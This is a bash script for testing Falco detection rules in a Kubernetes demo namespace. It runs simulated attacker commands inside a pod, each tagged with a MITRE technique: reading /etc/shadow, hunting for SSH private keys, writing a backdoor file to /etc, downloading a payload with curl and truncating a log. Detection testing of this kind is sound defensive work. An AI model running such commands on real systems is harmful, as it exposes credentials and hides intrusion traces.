#!/usr/bin/env bash
# Simulates attacker behaviour inside a pod to trigger Falco detections.
# Safe: everything happens inside the throw-away "demo" namespace.
set -uo pipefail

NS=demo
POD=$(kubectl get pod -n "$NS" -l app=web-app -o jsonpath='{.items[0].metadata.name}')
run() { echo ">> $1"; kubectl exec -n "$NS" "$POD" -- sh -c "$2" >/dev/null 2>&1 || true; sleep 2; }

echo "Target pod: $NS/$POD"

# MITRE T1003 - Credential access (default rule: Read sensitive file untrusted)
run "Reading /etc/shadow"                    "cat /etc/shadow"

# MITRE T1552 - Search for private keys (default rule: Search Private Keys or Passwords)
run "Searching for SSH private keys"         "find / -name id_rsa 2>/dev/null"

# Persistence - custom rule: Write to Sensitive Directory in Container
run "Writing to /etc"                        "echo 'backdoor' > /etc/backdoor.conf"

# Drift - custom rule: Package Manager Executed in Container
run "Installing a tool with apt-get"         "apt-get update"

# Discovery / download - custom rule: Network Tool Launched in Container
run "Downloading a payload with curl"        "curl -s http://example.com -o /tmp/payload"

# Defense evasion (default rule: Clear Log Activities)
run "Truncating a log file"                  ": > /var/log/nginx/access.log"

echo
echo "Done. Check: Grafana SOC dashboard, Falcosidekick UI and your Slack channel."
echo "Raw Falco logs: kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=30"
echo "Interactive test (Terminal shell in container): kubectl exec -it -n $NS $POD -- sh"
